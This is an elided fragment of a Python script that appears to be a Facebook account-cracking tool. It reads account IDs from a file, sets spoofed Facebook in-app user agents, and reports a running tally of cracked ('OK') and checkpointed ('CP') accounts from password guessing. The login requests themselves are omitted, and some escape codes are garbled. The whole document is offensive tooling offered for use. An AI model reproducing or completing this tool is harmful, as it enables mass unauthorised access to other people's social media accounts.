...
headers = {
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118',
}
...
class D:
	...
	def plerr(self):
		...
		try:
			...
			fileX = input ('\x1b[1;93mادخل المسار  FILE : ')
			os.system('clear')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\x1b[1;89m ID : \x1b[1;97m'+str(len(id)))
			Settings()
		except IOError:
...
def passwrd():
	print(f"\x1b[1;97m------------------------------------------------------------")
	print(f' \033[1;92mAil MO ')
	print('\022[1;82 py OIOINU1  / OIOINU')
	print(f"\x1b[1;97m------------------------------------------------------------")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r •Ail alose• {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Safari/537.36  (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
